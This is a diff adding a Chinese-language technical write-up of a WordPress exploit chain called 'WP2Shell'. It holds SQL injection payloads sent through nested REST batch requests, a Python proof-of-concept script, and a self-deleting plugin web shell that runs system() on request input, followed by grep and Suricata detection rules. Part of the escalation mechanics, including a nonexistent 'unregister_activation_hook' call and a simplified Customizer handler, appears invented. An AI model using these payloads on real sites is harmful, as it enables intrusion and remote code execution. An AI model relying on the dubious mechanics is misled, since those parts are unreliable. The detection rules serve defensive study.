+<span class="w">        </span><span class="n">Note</span><span class="w"> </span><span class="n">over</span><span class="w"> </span><span class="n">Customizer</span><span class="p">:</span><span class="w"> </span><span class="n">Step2</span><span class="p">:</span><span class="w"> </span><span class="n">Customizer滥用上下文提升</span>
+<span class="w">        </span><span class="n">Customizer</span><span class="o">-&gt;&gt;</span><span class="n">DB</span><span class="p">:</span><span class="w"> </span><span class="err">读取</span><span class="n">pending</span><span class="w"> </span><span class="n">customize_changeset</span>
+<span class="w">        </span><span class="n">DB</span><span class="o">--&gt;&gt;</span><span class="n">Customizer</span><span class="p">:</span><span class="w"> </span><span class="err">返回伪造行</span><span class="p">(</span><span class="n">post_type</span><span class="o">=</span><span class="n">request</span><span class="p">)</span>
+<span class="w">        </span><span class="n">Customizer</span><span class="o">-&gt;&gt;</span><span class="n">Customizer</span><span class="p">:</span><span class="w"> </span><span class="n">parse_request处理器触发</span>
+<span class="w">        </span><span class="n">Customizer</span><span class="o">-&gt;&gt;</span><span class="n">Customizer</span><span class="p">:</span><span class="w"> </span><span class="err">以伪造</span><span class="n">admin用户ID上下文处理</span>
+<span class="w">    </span><span class="n">end</span>
+
+<span class="w">    </span><span class="n">rect</span><span class="w"> </span><span class="n">rgb</span><span class="p">(</span><span class="mi">230</span><span class="p">,</span><span class="w"> </span><span class="mi">230</span><span class="p">,</span><span class="w"> </span><span class="mi">255</span><span class="p">)</span>
+<span class="w">        </span><span class="n">Note</span><span class="w"> </span><span class="n">over</span><span class="w"> </span><span class="n">UsersAPI</span><span class="p">,</span><span class="n">Plugin</span><span class="p">:</span><span class="w"> </span><span class="n">Step3</span><span class="p">:</span><span class="w"> </span><span class="n">RCE执行</span>
+<span class="w">        </span><span class="n">Customizer</span><span class="o">-&gt;&gt;</span><span class="n">UsersAPI</span><span class="p">:</span><span class="w"> </span><span class="n">POST</span><span class="w"> </span><span class="o">/</span><span class="n">wp</span><span class="o">/</span><span class="n">v2</span><span class="o">/</span><span class="n">users</span><span class="w"> </span><span class="p">(</span><span class="n">admin上下文</span><span class="p">)</span>
+<span class="w">        </span><span class="n">UsersAPI</span><span class="o">--&gt;&gt;</span><span class="n">Attacker</span><span class="p">:</span><span class="w"> </span><span class="err">创建新管理员账户</span>
+<span class="w">        </span><span class="n">Attacker</span><span class="o">-&gt;&gt;</span><span class="n">Attacker</span><span class="p">:</span><span class="w"> </span><span class="err">获取</span><span class="n">admin</span><span class="w"> </span><span class="n">nonce</span>
+<span class="w">        </span><span class="n">Attacker</span><span class="o">-&gt;&gt;</span><span class="n">Plugin</span><span class="p">:</span><span class="w"> </span><span class="err">安装内联插件</span><span class="p">(</span><span class="err">含</span><span class="n">PHP</span><span class="w"> </span><span class="n">payload</span><span class="p">)</span>
+<span class="w">        </span><span class="n">Plugin</span><span class="o">-&gt;&gt;</span><span class="n">Plugin</span><span class="p">:</span><span class="w"> </span><span class="err">执行任意</span><span class="n">PHP代码</span>
+<span class="w">        </span><span class="n">Plugin</span><span class="o">-&gt;&gt;</span><span class="n">Plugin</span><span class="p">:</span><span class="w"> </span><span class="n">unregister_activation_hook</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="err">自毁</span>
+<span class="w">    </span><span class="n">end</span>
+
+<span class="w">    </span><span class="n">Note</span><span class="w"> </span><span class="n">over</span><span class="w"> </span><span class="n">Attacker</span><span class="p">:</span><span class="w"> </span><span class="n">RCE完成</span><span class="p">,</span><span class="w"> </span><span class="err">痕迹清除</span>
+</code></pre></div>
+
+<h3>5.2 RCE 升级三步详解</h3>
+<h3>5.2.1 Step 1：UNION 注入伪造数据库行</h3>
+<p>单纯获取数据（如密码哈希）固然有害，但 WP2Shell 的目标是 RCE，因此利用方向是<strong>写入而非读取</strong>。</p>
+<p>oEmbed 是 WordPress 的内容嵌入机制，当文章中包含外部 URL 时，WordPress 会请求 oEmbed provider 获取嵌入数据，并将处理结果作为 <code>wp_oembed_cache</code> 类型的文章缓存到 <code>wp_posts</code> 表。这个缓存写入路径是攻击的关键——它允许 UNION 注入的结果以"文章"形式持久化到数据库。</p>
+<p>攻击者构造 UNION SELECT，使其返回的行严格匹配 <code>wp_posts</code> 表的 schema（列数、类型、字段含义），并植入特殊内容：</p>
+<div class="highlight"><pre><span></span><code><span class="c1">-- 伪SQL：UNION伪造一行 customize_changeset 类型的文章</span>
+<span class="k">UNION</span><span class="w"> </span><span class="k">ALL</span><span class="w"> </span><span class="k">SELECT</span>
+<span class="w">    </span><span class="k">NULL</span><span class="p">,</span><span class="w">                          </span><span class="c1">-- ID (自增)</span>
+<span class="w">    </span><span class="mi">1</span><span class="p">,</span><span class="w">                             </span><span class="c1">-- post_author (后续会被覆盖)</span>
+<span class="w">    </span><span class="s1">&#39;2026-07-20 00:00:00&#39;</span><span class="p">,</span><span class="w">         </span><span class="c1">-- post_date</span>
+<span class="w">    </span><span class="s1">&#39;2026-07-20 00:00:00&#39;</span><span class="p">,</span><span class="w">         </span><span class="c1">-- post_date_gmt</span>
+<span class="w">    </span><span class="s1">&#39;[malicious_shortcode]&#39;</span><span class="p">,</span><span class="w">       </span><span class="c1">-- post_content (shortcode标记指向攻击者内容)</span>
+<span class="w">    </span><span class="s1">&#39;forged-changeset&#39;</span><span class="p">,</span><span class="w">            </span><span class="c1">-- post_title</span>
+<span class="w">    </span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="w">                            </span><span class="c1">-- post_excerpt</span>
+<span class="w">    </span><span class="s1">&#39;publish&#39;</span><span class="p">,</span><span class="w">                     </span><span class="c1">-- post_status</span>
+<span class="w">    </span><span class="s1">&#39;closed&#39;</span><span class="p">,</span><span class="w">                      </span><span class="c1">-- comment_status</span>
+<span class="w">    </span><span class="s1">&#39;closed&#39;</span><span class="p">,</span><span class="w">                      </span><span class="c1">-- ping_status</span>
+<span class="w">    </span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="w">                            </span><span class="c1">-- post_password</span>
+<span class="w">    </span><span class="s1">&#39;forged-changeset&#39;</span><span class="p">,</span><span class="w">            </span><span class="c1">-- post_name</span>
+<span class="w">    </span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="w">                            </span><span class="c1">-- to_ping</span>
+<span class="w">    </span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="w">                            </span><span class="c1">-- pinged</span>
+<span class="w">    </span><span class="s1">&#39;2026-07-20 00:00:00&#39;</span><span class="p">,</span><span class="w">         </span><span class="c1">-- post_modified</span>
+<span class="w">    </span><span class="s1">&#39;2026-07-20 00:00:00&#39;</span><span class="p">,</span><span class="w">         </span><span class="c1">-- post_modified_gmt</span>
+<span class="w">    </span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="w">                            </span><span class="c1">-- post_content_filtered</span>
+<span class="w">    </span><span class="mi">0</span><span class="p">,</span><span class="w">                             </span><span class="c1">-- post_parent</span>
+<span class="w">    </span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="w">                            </span><span class="c1">-- guid</span>
+<span class="w">    </span><span class="mi">0</span><span class="p">,</span><span class="w">                             </span><span class="c1">-- menu_order</span>
+<span class="w">    </span><span class="s1">&#39;customize_changeset&#39;</span><span class="p">,</span><span class="w">         </span><span class="c1">-- post_type ← 关键: 触发Customizer处理</span>
+<span class="w">    </span><span class="s1">&#39;pending&#39;</span><span class="w">                      </span><span class="c1">-- post_mime_type / 状态</span>
+<span class="c1">-- 后续通过meta设置admin用户ID</span>
+</code></pre></div>
+
+<p>伪造行中：
+- <code>post_type = 'customize_changeset'</code>：使其被 Customizer 识别为待处理的变更集
+- <code>post_content</code> 包含 shortcode 标记，指向攻击者控制的内容
+- 配套写入 <code>wp_postmeta</code>，设置 <code>admin</code> 用户 ID 作为变更集的所有者</p>
+<h3>5.2.2 Step 2：Customizer 滥用提升上下文</h3>
+<p>WordPress Customizer（自定义器）用于管理主题外观变更。变更集（changeset）以 <code>customize_changeset</code> 类型的文章存储，状态包括 <code>draft</code>、<code>pending</code>、<code>publish</code>。当变更集处于 <code>pending</code> 状态且 <code>post_type</code> 包含 <code>request</code> 标记时，会触发 <code>parse_request</code> 处理器。</p>
+<p>攻击者利用伪造的 <code>customize_changeset</code> 行触发该处理器：</p>
+<div class="highlight"><pre><span></span><code><span class="x">// 简化的 Customizer changeset 处理逻辑</span>
+<span class="x">function handle_pending_changeset( $post ) {</span>
+<span class="x">    // 从伪造行读取 meta 中的用户 ID</span>
+<span class="x">    $user_id = get_post_meta( $post-&gt;ID, &#39;_changeset_user&#39;, true );</span>
+<span class="x">    // 以该用户身份加载上下文</span>
+<span class="x">    wp_set_current_user( $user_id );  // $user_id = admin ID</span>
+<span class="x">    // 在 admin 上下文中处理 pending changeset</span>
+<span class="x">    $this-&gt;process_changeset( $post );</span>
+<span class="x">}</span>
+</code></pre></div>
+
+<p>由于伪造行中 meta 设置了管理员用户 ID，<code>wp_set_current_user()</code> 将当前执行上下文切换为管理员。此时尚未直接执行 PHP，但攻击者已获得管理员级别的 REST API 访问权限——这是一个关键的权限提升跳板。</p>
+<h3>5.2.3 Step 3：管理员创建 + 自毁插件执行</h3>
+<p>在提升的 admin 上下文中，攻击者执行最后的 RCE 步骤：</p>
+<ol>
+<li><strong>创建管理员账户</strong>：<code>POST /wp/v2/users</code>，以 admin 上下文创建新管理员账户。</li>
+<li><strong>获取 nonce</strong>：使用新管理员身份请求管理页面，提取 <code>wp_rest</code> nonce 和插件管理 nonce。</li>
+<li><strong>安装内联插件</strong>：通过插件安装接口上传一段内联 PHP 插件代码（非文件上传，而是直接注册插件内容）。</li>
+<li><strong>执行 payload</strong>：插件激活时执行任意 PHP 代码。</li>
+<li><strong>自毁清痕</strong>：调用 <code>unregister_activation_hook</code> 并删除插件记录，清除痕迹。</li>
+</ol>
+<div class="highlight"><pre><span></span><code><span class="x">// 伪代码：内联插件 payload</span>
+<span class="cp">&lt;?php</span>
+<span class="cm">/*</span>
+<span class="cm">Plugin Name: transient-helper</span>
+<span class="cm">*/</span>
+<span class="c1">// 激活时执行</span>
+<span class="nx">register_activation_hook</span><span class="p">(</span> <span class="no">__FILE__</span><span class="p">,</span> <span class="k">function</span> <span class="p">()</span> <span class="p">{</span>
+    <span class="c1">// 攻击者 payload</span>
+    <span class="nb">system</span><span class="p">(</span> <span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">]</span> <span class="p">);</span>
+    <span class="c1">// 自毁：移除激活钩子并标记删除</span>
+    <span class="nx">unregister_activation_hook</span><span class="p">(</span> <span class="no">__FILE__</span><span class="p">,</span> <span class="s1">&#39;__return_true&#39;</span> <span class="p">);</span>
+    <span class="c1">// 删除自身痕迹</span>
+    <span class="o">@</span><span class="nb">unlink</span><span class="p">(</span> <span class="no">__FILE__</span> <span class="p">);</span>
+<span class="p">}</span> <span class="p">);</span>
+</code></pre></div>
+
+<p>自毁机制使检测难度大幅增加——插件在执行 payload 后立即移除自身文件和钩子注册，常规文件完整性检查难以捕获。</p>
+<h3>5.3 对象缓存的影响</h3>
+<p>当 WordPress 配置了持久化对象缓存（Redis 或 Memcached）时，oEmbed transient 的写入路径发生改变：</p>
+<table>
+<thead>
+<tr>
+<th>条件</th>
+<th>oEmbed 写入路径</th>
+<th>SQL 注入</th>
+<th>RCE 链</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>无对象缓存（默认）</td>
+<td>直接写入 <code>wp_posts</code></td>
+<td>可利用</td>
+<td>可利用</td>
+</tr>
+<tr>
+<td>Redis/Memcached</td>
+<td>transient 写入对象缓存，绕过 <code>wp_posts</code></td>
+<td>可利用</td>
+<td><strong>失败</strong></td>
+</tr>
+</tbody>
+</table>
+<p>原因：oEmbed 缓存机制在对象缓存存在时，会将 transient 数据写入 Redis/Memcached 而非 <code>wp_posts</code> 表。Step 1 依赖 UNION 注入结果被持久化到 <code>wp_posts</code> 以伪造 <code>customize_changeset</code> 行——对象缓存改变写入路径后，伪造行无法落库，后续 Customizer 上下文提升无从触发。</p>
+<p>但需注意：<strong>SQL 注入本身仍然可利用</strong>。攻击者虽无法升级到 RCE，但仍可通过时间盲注/UNION 注入窃取数据库内容（用户密码哈希、密钥、会话 token 等），危害依然严重。</p>
+<hr />
+<h2>六、PoC 请求结构</h2>
+<p>WP2Shell 利用嵌套批量请求（nested batch）构造，外层 batch 包含一个内层 batch 子请求，内层 batch 再包含实际的 widgets 和 posts 子请求。这种嵌套结构用于稳定触发数组错位条件。</p>
+<h3>6.1 完整 PoC 请求</h3>
+<div class="highlight"><pre><span></span><code><span class="nf">POST</span> <span class="nn">/wp-json/batch/v1</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="o">:</span> <span class="l">vulnerable-target.example.com</span>
+<span class="na">Content-Type</span><span class="o">:</span> <span class="l">application/json</span>
+
+<span class="p">{</span>
+<span class="w">  </span><span class="nt">&quot;requests&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span>
+<span class="w">    </span><span class="p">{</span>
+<span class="w">      </span><span class="nt">&quot;path&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;/batch/v1&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;body&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nt">&quot;requests&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span>
+<span class="w">          </span><span class="p">{</span>
+<span class="w">            </span><span class="nt">&quot;path&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;/wp/v2/widgets&quot;</span>
+<span class="w">          </span><span class="p">},</span>
+<span class="w">          </span><span class="p">{</span>
+<span class="w">            </span><span class="nt">&quot;path&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;/wp/v2/posts&quot;</span><span class="p">,</span>
+<span class="w">            </span><span class="nt">&quot;query&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">              </span><span class="nt">&quot;per_page&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;-1&quot;</span><span class="p">,</span>
+<span class="w">              </span><span class="nt">&quot;author__not_in&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;1) AND (SELECT 1 FROM (SELECT SLEEP(5))x) AND (1=1&quot;</span>
+<span class="w">            </span><span class="p">}</span>
+<span class="w">          </span><span class="p">}</span>
+<span class="w">        </span><span class="p">]</span>
+<span class="w">      </span><span class="p">}</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">  </span><span class="p">]</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<h3>6.2 请求结构解析</h3>
+<table>
+<thead>
+<tr>
+<th>层级</th>
+<th>路径</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>外层 batch</td>
+<td><code>/batch/v1</code></td>
+<td>触发外层批量调度，建立验证/执行数组环境</td>
+</tr>
+<tr>
+<td>内层 batch（子请求1）</td>
+<td><code>/batch/v1</code></td>
+<td>嵌套触发内层批量调度，构造错位条件</td>
+</tr>
+<tr>
+<td>内层子请求1</td>
+<td><code>/wp/v2/widgets</code></td>
+<td>公开端点，提供 <code>public</code> 权限上下文</td>
+</tr>
+<tr>
+<td>内层子请求2</td>
+<td><code>/wp/v2/posts</code></td>
+<td>携带注入 payload，借错位获得 public 上下文</td>
+</tr>
+</tbody>
+</table>
+<h3>6.3 概念验证代码（Python）</h3>
+<div class="highlight"><pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">requests</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">time</span>
+
+<span class="n">TARGET</span> <span class="o">=</span> <span class="s2">&quot;https://vulnerable-target.example.com&quot;</span>
+<span class="n">BATCH_URL</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">TARGET</span><span class="si">}</span><span class="s2">/wp-json/batch/v1&quot;</span>
+
+<span class="c1"># 阶段1：时间盲注确认注入点</span>
+<span class="n">sqli_payload</span> <span class="o">=</span> <span class="s2">&quot;1) AND (SELECT 1 FROM (SELECT SLEEP(5))x) AND (1=1&quot;</span>
+
+<span class="n">nested_batch</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="s2">&quot;requests&quot;</span><span class="p">:</span> <span class="p">[</span>
+        <span class="p">{</span>
+            <span class="s2">&quot;path&quot;</span><span class="p">:</span> <span class="s2">&quot;/batch/v1&quot;</span><span class="p">,</span>
+            <span class="s2">&quot;body&quot;</span><span class="p">:</span> <span class="p">{</span>
+                <span class="s2">&quot;requests&quot;</span><span class="p">:</span> <span class="p">[</span>
+                    <span class="p">{</span><span class="s2">&quot;path&quot;</span><span class="p">:</span> <span class="s2">&quot;/wp/v2/widgets&quot;</span><span class="p">},</span>
+                    <span class="p">{</span>
+                        <span class="s2">&quot;path&quot;</span><span class="p">:</span> <span class="s2">&quot;/wp/v2/posts&quot;</span><span class="p">,</span>
+                        <span class="s2">&quot;query&quot;</span><span class="p">:</span> <span class="p">{</span>
+                            <span class="s2">&quot;per_page&quot;</span><span class="p">:</span> <span class="s2">&quot;-1&quot;</span><span class="p">,</span>
+                            <span class="s2">&quot;author__not_in&quot;</span><span class="p">:</span> <span class="n">sqli_payload</span>
+                        <span class="p">}</span>
+                    <span class="p">}</span>
+                <span class="p">]</span>
+            <span class="p">}</span>
+        <span class="p">}</span>
+    <span class="p">]</span>
+<span class="p">}</span>
+
+<span class="n">start</span> <span class="o">=</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span>
+<span class="n">resp</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">BATCH_URL</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="n">nested_batch</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">30</span><span class="p">)</span>
+<span class="n">elapsed</span> <span class="o">=</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span> <span class="o">-</span> <span class="n">start</span>
+
+<span class="k">if</span> <span class="n">elapsed</span> <span class="o">&gt;=</span> <span class="mi">5</span><span class="p">:</span>
+    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[+] SQL注入确认: 响应延迟 </span><span class="si">{</span><span class="n">elapsed</span><span class="si">:</span><span class="s2">.2f</span><span class="si">}</span><span class="s2">s (SLEEP触发)&quot;</span><span class="p">)</span>
+<span class="k">else</span><span class="p">:</span>
+    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[-] 未检测到延迟: </span><span class="si">{</span><span class="n">elapsed</span><span class="si">:</span><span class="s2">.2f</span><span class="si">}</span><span class="s2">s&quot;</span><span class="p">)</span>
+
+<span class="c1"># 阶段2：UNION注入伪造数据行（概念示意，实际列数需枚举）</span>
+<span class="n">union_payload</span> <span class="o">=</span> <span class="p">(</span>
+    <span class="s2">&quot;1) AND 1=0 UNION ALL SELECT &quot;</span>
+    <span class="s2">&quot;NULL,1,NOW(),NOW(),&#39;[payload_shortcode]&#39;,&quot;</span>
+    <span class="s2">&quot;&#39;forged&#39;,&#39;&#39;,&#39;publish&#39;,&#39;closed&#39;,&#39;closed&#39;,&#39;&#39;,&#39;forged&#39;,&quot;</span>
+    <span class="s2">&quot;&#39;&#39;,&#39;&#39;,&#39;&#39;,NOW(),NOW(),&#39;&#39;,&#39;0&#39;,&#39;&#39;,0,&#39;customize_changeset&#39;,&#39;pending&#39; -- -&quot;</span>
+<span class="p">)</span>
+
+<span class="n">rce_batch</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="s2">&quot;requests&quot;</span><span class="p">:</span> <span class="p">[</span>
+        <span class="p">{</span>
+            <span class="s2">&quot;path&quot;</span><span class="p">:</span> <span class="s2">&quot;/batch/v1&quot;</span><span class="p">,</span>
+            <span class="s2">&quot;body&quot;</span><span class="p">:</span> <span class="p">{</span>
+                <span class="s2">&quot;requests&quot;</span><span class="p">:</span> <span class="p">[</span>
+                    <span class="p">{</span><span class="s2">&quot;path&quot;</span><span class="p">:</span> <span class="s2">&quot;/wp/v2/widgets&quot;</span><span class="p">},</span>
+                    <span class="p">{</span>
+                        <span class="s2">&quot;path&quot;</span><span class="p">:</span> <span class="s2">&quot;/wp/v2/posts&quot;</span><span class="p">,</span>
+                        <span class="s2">&quot;query&quot;</span><span class="p">:</span> <span class="p">{</span>
+                            <span class="s2">&quot;per_page&quot;</span><span class="p">:</span> <span class="s2">&quot;-1&quot;</span><span class="p">,</span>
+                            <span class="s2">&quot;author__not_in&quot;</span><span class="p">:</span> <span class="n">union_payload</span>
+                        <span class="p">}</span>
+                    <span class="p">}</span>
+                <span class="p">]</span>
+            <span class="p">}</span>
+        <span class="p">}</span>
+    <span class="p">]</span>
+<span class="p">}</span>
+
+<span class="n">resp</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">BATCH_URL</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="n">rce_batch</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">30</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[*] UNION注入响应状态: </span><span class="si">{</span><span class="n">resp</span><span class="o">.</span><span class="n">status_code</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+</code></pre></div>
+
+<hr />
+<h2>七、检测规则</h2>
+<h3>7.1 Nginx 日志检测</h3>
+<p>通过 grep 检索访问日志中的批量端点异常调用与注入特征：</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># 检测1: 批量端点访问（基线监控）</span>
+grep<span class="w"> </span>-E<span class="w"> </span><span class="s1">&#39;POST /wp-json/batch/v1&#39;</span><span class="w"> </span>/var/log/nginx/access.log
+
+<span class="c1"># 检测2: author__not_in 参数出现非数字字符（注入特征）</span>
+grep<span class="w"> </span>-E<span class="w"> </span><span class="s1">&#39;author__not_in=[^0-9&amp;]&#39;</span><span class="w"> </span>/var/log/nginx/access.log
+
+<span class="c1"># 检测3: SQL注入关键字出现在请求中</span>
+grep<span class="w"> </span>-iE<span class="w"> </span><span class="s1">&#39;(UNION|SELECT|SLEEP|BENCHMARK|AND[[:space:]]+1=[01]|NOT[[:space:]]+IN)&#39;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">    </span>/var/log/nginx/access.log
+
+<span class="c1"># 检测4: 嵌套 batch 路径（WP2Shell特征）</span>
+grep<span class="w"> </span>-E<span class="w"> </span><span class="s1">&#39;path.*batch/v1.*path.*wp/v2/(widgets|posts)&#39;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">    </span>/var/log/nginx/access.log
+
+<span class="c1"># 检测5: per_page=-1 配合 posts 端点</span>
+grep<span class="w"> </span>-E<span class="w"> </span><span class="s1">&#39;per_page=-1.*wp/v2/posts&#39;</span><span class="w"> </span>/var/log/nginx/access.log
+
+<span class="c1"># 检测6: RCE阶段特征——users端点创建（需结合频率）</span>
+grep<span class="w"> </span>-E<span class="w"> </span><span class="s1">&#39;POST /wp-json/wp/v2/users&#39;</span><span class="w"> </span>/var/log/nginx/access.log
+</code></pre></div>
+
+<h3>7.2 Suricata 规则</h3>
+<div class="highlight"><pre><span></span><code><span class="err">#</span><span class="w"> </span><span class="nx">规则1</span><span class="p">:</span><span class="w"> </span><span class="nx">检测</span><span class="w"> </span><span class="nx">WP2Shell</span><span class="w"> </span><span class="nx">嵌套批量请求</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">author__not_in</span><span class="w"> </span><span class="nx">注入</span>
+<span class="nx">alert</span><span class="w"> </span><span class="nx">http</span><span class="w"> </span><span class="err">$</span><span class="nx">EXTERNAL_NET</span><span class="w"> </span><span class="nx">any</span><span class="w"> </span><span class="o">-&gt;</span><span class="w"> </span><span class="err">$</span><span class="nx">HOME_NET</span><span class="w"> </span><span class="nx">any</span><span class="w"> </span><span class="p">(</span>
+<span class="w">    </span><span class="nx">msg</span><span class="p">:</span><span class="s">&quot;WORDPRESS WP2Shell CVE-2026-63030+CVE-2026-60137 batch injection attempt&quot;</span><span class="p">;</span>
+<span class="w">    </span><span class="nx">flow</span><span class="p">:</span><span class="nx">established</span><span class="p">,</span><span class="nx">to_server</span><span class="p">;</span>
+<span class="w">    </span><span class="nx">http</span><span class="p">.</span><span class="nx">method</span><span class="p">;</span><span class="w"> </span><span class="nx">content</span><span class="p">:</span><span class="s">&quot;POST&quot;</span><span class="p">;</span>
+<span class="w">    </span><span class="nx">http</span><span class="p">.</span><span class="nx">uri</span><span class="p">;</span><span class="w"> </span><span class="nx">content</span><span class="p">:</span><span class="s">&quot;/wp-json/batch/v1&quot;</span><span class="p">;</span>
+<span class="w">    </span><span class="nx">http</span><span class="p">.</span><span class="nx">request_body</span><span class="p">;</span><span class="w"> </span><span class="nx">content</span><span class="p">:</span><span class="s">&quot;author__not_in&quot;</span><span class="p">;</span>
+<span class="w">    </span><span class="nx">http</span><span class="p">.</span><span class="nx">request_body</span><span class="p">;</span><span class="w"> </span><span class="nx">pcre</span><span class="p">:</span><span class="s">&quot;/author__not_in[^&amp;]*(UNION|SELECT|SLEEP|AND\s)/Ui&quot;</span><span class="p">;</span>
+<span class="w">    </span><span class="nx">classtype</span><span class="p">:</span><span class="nx">web</span><span class="o">-</span><span class="nx">application</span><span class="o">-</span><span class="nx">attack</span><span class="p">;</span>
+<span class="w">    </span><span class="nx">sid</span><span class="p">:</span><span class="mi">2026630001</span><span class="p">;</span><span class="w"> </span><span class="nx">rev</span><span class="p">:</span><span class="mi">1</span><span class="p">;</span>
+<span class="w">    </span><span class="nx">reference</span><span class="p">:</span><span class="nx">url</span><span class="p">,</span><span class="nx">brandefense</span><span class="p">.</span><span class="nx">com</span><span class="o">/</span><span class="nx">blog</span><span class="o">/</span><span class="nx">wp2shell</span><span class="o">-</span><span class="nx">analysis</span><span class="p">;</span>
+<span class="p">)</span>
+
+<span class="err">#</span><span class="w"> </span><span class="nx">规则2</span><span class="p">:</span><span class="w"> </span><span class="nx">检测路由混淆特征</span><span class="err">——</span><span class="nx">widgets</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">posts</span><span class="w"> </span><span class="nx">组合于同一batch</span>
+<span class="nx">alert</span><span class="w"> </span><span class="nx">http</span><span class="w"> </span><span class="err">$</span><span class="nx">EXTERNAL_NET</span><span class="w"> </span><span class="nx">any</span><span class="w"> </span><span class="o">-&gt;</span><span class="w"> </span><span class="err">$</span><span class="nx">HOME_NET</span><span class="w"> </span><span class="nx">any</span><span class="w"> </span><span class="p">(</span>
+<span class="w">    </span><span class="nx">msg</span><span class="p">:</span><span class="s">&quot;WORDPRESS WP2Shell routing desync widgets+posts batch pattern&quot;</span><span class="p">;</span>
+<span class="w">    </span><span class="nx">flow</span><span class="p">:</span><span class="nx">established</span><span class="p">,</span><span class="nx">to_server</span><span class="p">;</span>
+<span class="w">    </span><span class="nx">http</span><span class="p">.</span><span class="nx">uri</span><span class="p">;</span><span class="w"> </span><span class="nx">content</span><span class="p">:</span><span class="s">&quot;/wp-json/batch/v1&quot;</span><span class="p">;</span>
+<span class="w">    </span><span class="nx">http</span><span class="p">.</span><span class="nx">request_body</span><span class="p">;</span><span class="w"> </span><span class="nx">content</span><span class="p">:</span><span class="s">&quot;/wp/v2/widgets&quot;</span><span class="p">;</span>
+<span class="w">    </span><span class="nx">http</span><span class="p">.</span><span class="nx">request_body</span><span class="p">;</span><span class="w"> </span><span class="nx">content</span><span class="p">:</span><span class="s">&quot;/wp/v2/posts&quot;</span><span class="p">;</span>
+<span class="w">    </span><span class="nx">http</span><span class="p">.</span><span class="nx">request_body</span><span class="p">;</span><span class="w"> </span><span class="nx">content</span><span class="p">:</span><span class="s">&quot;per_page&quot;</span><span class="p">;</span><span class="w"> </span><span class="nx">nocase</span><span class="p">;</span>
+<span class="w">    </span><span class="nx">classtype</span><span class="p">:</span><span class="nx">web</span><span class="o">-</span><span class="nx">application</span><span class="o">-</span><span class="nx">attack</span><span class="p">;</span>
+<span class="w">    </span><span class="nx">sid</span><span class="p">:</span><span class="mi">2026630002</span><span class="p">;</span><span class="w"> </span><span class="nx">rev</span><span class="p">:</span><span class="mi">1</span><span class="p">;</span>
+<span class="p">)</span>
+
+<span class="err">#</span><span class="w"> </span><span class="nx">规则3</span><span class="p">:</span><span class="w"> </span><span class="nx">检测</span><span class="w"> </span><span class="nx">customize_changeset</span><span class="w"> </span><span class="nx">伪造特征</span><span class="err">（</span><span class="nx">UNION注入</span><span class="err">）</span>
+<span class="nx">alert</span><span class="w"> </span><span class="nx">http</span><span class="w"> </span><span class="err">$</span><span class="nx">EXTERNAL_NET</span><span class="w"> </span><span class="nx">any</span><span class="w"> </span><span class="o">-&gt;</span><span class="w"> </span><span class="err">$</span><span class="nx">HOME_NET</span><span class="w"> </span><span class="nx">any</span><span class="w"> </span><span class="p">(</span>
+<span class="w">    </span><span class="nx">msg</span><span class="p">:</span><span class="s">&quot;WORDPRESS WP2Shell UNION injection forging customize_changeset&quot;</span><span class="p">;</span>
+<span class="w">    </span><span class="nx">flow</span><span class="p">:</span><span class="nx">established</span><span class="p">,</span><span class="nx">to_server</span><span class="p">;</span>
+<span class="w">    </span><span class="nx">http</span><span class="p">.</span><span class="nx">uri</span><span class="p">;</span><span class="w"> </span><span class="nx">content</span><span class="p">:</span><span class="s">&quot;/wp-json/batch/v1&quot;</span><span class="p">;</span>
